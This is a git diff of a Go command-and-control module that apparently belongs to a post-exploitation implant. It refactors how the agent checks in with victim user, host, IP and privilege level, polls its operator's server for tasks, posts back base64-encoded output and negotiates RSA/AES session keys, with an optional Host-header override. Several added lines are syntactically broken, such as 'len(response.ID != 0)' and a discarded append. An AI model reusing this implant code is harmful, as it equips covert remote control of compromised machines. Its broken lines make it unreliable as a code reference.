@@ -130,43 +130,42 @@ func (c C2Default) RsaKey() *rsa.PrivateKey {
 func (c *C2Default) SetRsaKey(newKey *rsa.PrivateKey) {
 	c.RsaPrivateKey = newKey
 }
+
 // CheckIn - check in a new agent
 func (c *C2Default) CheckIn(ip string, pid int, user string, host string) map[string]interface{} {
 	var resp []byte
-	// Use dynamic JSON
 
-	checkin := structs.Msg{"action": "checkin", "user": user, "host": host, "ip": ip, "pid": pid, "uuid": c.UUID}
-
-	/*checkin := structs.CheckInStruct{}
+	checkin := structs.CheckInMessage{}
+	checkin.Action = "checkin"
 	checkin.User = user
 	checkin.Host = host
 	checkin.IP = ip
 	checkin.Pid = pid
-	checkin.UUID = c.UUID*/
+	checkin.UUID = c.UUID
 	if functions.IsElevated() {
-		checkin["integrity_level"] = 3
+		checkin.IntegrityLevel = 3
 	} else {
-		checkin["integrity_level"] = 2
+		checkin.IntegrityLevel = 2
 	}
 
-	checkinMsg, _ := json.Marshal(checkin)
+	raw, _ := json.Marshal(checkin)
 	//log.Printf("Sending checkin msg: %+v\n", checkin)
-	// If exchangingKeys == true, then start EKE
-	if c.ExchangingKeys {
+
+	if c.ExchangingKeys { // If exchangingKeys == true, then start EKE
 		sID := c.NegotiateKey()
 
 		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
-		resp = c.htmlPostData(endpoint, checkinMsg)
+		resp = c.htmlPostData(endpoint, raw)
 
 	} else {
-		// If we're not using encryption, we hit the callbacks endpoint directly
-		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
-		resp = c.htmlPostData(endpoint, checkinMsg)
+
+		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion) // If we're not using encryption, we hit the callbacks endpoint directly
+		resp = c.htmlPostData(endpoint, raw)
 		//log.Printf("Raw HTMLPostData response: %s\n", string(resp))
 	}
 
 	// save the apfell id
-	response := structs.Msg{}
+	response := structs.CheckInMessageResponse{}
 	err := json.Unmarshal(resp, &response)
 	//log.Printf("Raw response: %s", string(resp))
 	if err != nil {
@@ -175,31 +174,34 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) map[st
 	}
 
 	//log.Printf("Received ApfellID: %+v\n", c)
-	// Assign new UUID for the agent to use in every request
-	newUUID, exists := response["id"]
-	if exists {
-		c.UUID = newUUID
+
+	if len(response.ID != 0) {
+		c.UUID = response.ID // Assign new UUID for the agent to use in every request
+		c.ApfellID = response.ID
 	}
+
 	return response
 }
 
 //GetTasking - retrieve new tasks
-func (c *C2Default) GetTasking() map[string]interface{} {
+func (c *C2Default) GetTasking() interface{} {
 	//log.Printf("Current C2Default config: %+v\n", c)
 	url := fmt.Sprintf("%sapi/v%s/agent_message", c.BaseURL, ApiVersion)
-	request := structs.Msg{}
-	request["action"] = "get_tasking"
-	request["tasking_size"] = 1
+	//request := structs.Msg{}
+	request := structs.TaskRequestMessage{}
+	request.Action = "get_tasking"
+	request.TaskingSize = 1
 
 	raw, err := json.Marshal(request)
 
 	if err != nil {
 		// log.Printf("")
 	}
+
 	rawTask := c.htmlGetData(url, raw)
 	//log.Println("Raw HTMLGetData response: ", string(rawTask))
-	//task := structs.Task{}
-	task := structs.Msg{}
+
+	task := structs.TaskRequestMessageResponse{}
 	err = json.Unmarshal(rawTask, &task)
 
 	if err != nil {
@@ -233,9 +235,13 @@ func (c *C2Default) postRESTResponse(urlEnding string, data []byte) []byte {
 			break
 		}
 
-		tResp := structs.TaskResponse{}
-		tResp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
-		dataToSend, _ := json.Marshal(tResp)
+		responseMsg := structs.TaskResponseMessage{}
+		resp := structs.TaskResponse{}
+		resp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
+		append(responseMsg.Responses, resp...)
+		//tResp := structs.TaskResponse{}
+		//tResp.Response = base64.StdEncoding.EncodeToString(dataBuffer)
+		dataToSend, _ := json.Marshal(responseMsg)
 		ret := c.htmlPostData(urlEnding, dataToSend)
 		retData.Write(ret)
 	}
@@ -253,7 +259,7 @@ func (c *C2Default) htmlPostData(endpoint string, sendData []byte) []byte {
 		//sendData = c.encryptMessage(sendData)
 	}
 
-	sendData = append([]byte(c.UUID), sendData...) // Prepend the UUID
+	sendData = append([]byte(c.UUID), sendData...)                 // Prepend the UUID
 	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
 	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
 	contentLength := len(sendData)
@@ -309,7 +315,14 @@ func (c *C2Default) htmlGetData(url string, body []byte) []byte {
 	client := &http.Client{}
 	var respBody []byte
 
-	req, err := http.NewRequest("GET", url, bytes.NewBuffer(body))
+	if len(c.AesPSK != 0 && len(body) > 0) {
+
+		body = EncryptMessage(body, c.AesPSK) // Encrypt and then encapsulate the task request
+	}
+
+	body = append([]byte(c.UUID), body...)                         // Prepend the UUID to the body of the request
+	body = base64.StdEncoding.EncodeToString(body)                 // Base64 the body
+	req, err := http.NewRequest("GET", url, bytes.NewBuffer(body)) // Make the new request
 	if err != nil {
 		//fmt.Sprintf("Error completing GET request: %s", err)
 		//log.Println("Error completing GET request: ", err.Error())
@@ -318,7 +331,7 @@ func (c *C2Default) htmlGetData(url string, body []byte) []byte {
 
 	if len(c.HostHeader) > 0 {
 		//req.Header.Set("Host", c.HostHeader)
-		req.Host = c.HostHeader
+		req.Host = c.HostHeader // Change the host header if specified
 	}
 
 	req.Header.Set("User-Agent", c.UserAgent)
@@ -337,12 +350,12 @@ func (c *C2Default) htmlGetData(url string, body []byte) []byte {
 	defer resp.Body.Close()
 
 	body, _ = ioutil.ReadAll(resp.Body)
-	raw, err := base64.StdEncoding.DecodeString(string(body))
-	enc_raw := raw[36:]
+	raw, err := base64.StdEncoding.DecodeString(string(body)) // Remove the base64
+	enc_raw := raw[36:]                                       // Remove the prepended UUID
 
 	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
 		//return c.decryptMessage(respBody)
-		return DecryptMessage(enc_raw, c.AesPSK)
+		return DecryptMessage(enc_raw, c.AesPSK) // If the AES PSK is set, decrypt the response body and return
 	}
 
 	return enc_raw
@@ -355,41 +368,35 @@ func (c *C2Default) NegotiateKey() string {
 	pub, priv := crypto.GenerateRSAKeyPair()
 	c.RsaPrivateKey = priv
 	// Replace struct with dynamic json
-	initMessage := structs.Msg{
-		"action": "staging_rsa",
-		"session_id": sessionID,
-		"pub_key": base64.StdEncoding.EncodeToString(pub),
-	}
+	initMessage := structs.EkeKeyExchangeMessage{}
+	initMessage.Action = "staging_rsa"
+	initMessage.SessionID = sessionID
+	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)
 
 	// Encode and encrypt the json message
-	rawMsg, err := json.Marshal(initMessage)
+	raw, err := json.Marshal(initMessage)
 
 	if err != nil {
 		return ""
 	}
 
-	// Send the request to the EKE endpoint
-	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
+	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion) // Send the request to the EKE endpoint
 
-	resp := c.htmlPostData(endpoint, rawMsg)
-	// Decrypt & Unmarshal the response
+	resp := c.htmlPostData(endpoint, raw)
 
-	//decResp, _ := base64.StdEncoding.DecodeString(string(resp))
-	decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaKey())
-	sessionKeyResp := structs.Msg{}
+	decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaKey()) // Decrypt & Unmarshal the response
+	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
 
 	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
 	if err != nil {
 		return ""
 	}
 
-	// Save the new AES session key
-	c.AesPSK = sessionKeyResp["session_key"]
+	c.AesPSK = sessionKeyResp.SessionKey // Save the new AES session key
 	c.ExchangingKeys = false
 
-	newUUID, exist := sessionKeyResp["uuid"]
-	if exist {
-		c.UUID = newUUID
+	if len(sessionKeyResp.UUID) > 0 {
+		c.UUID = sessionKeyResp.UUID // Save the new UUID
 	}
 
 	return sessionID
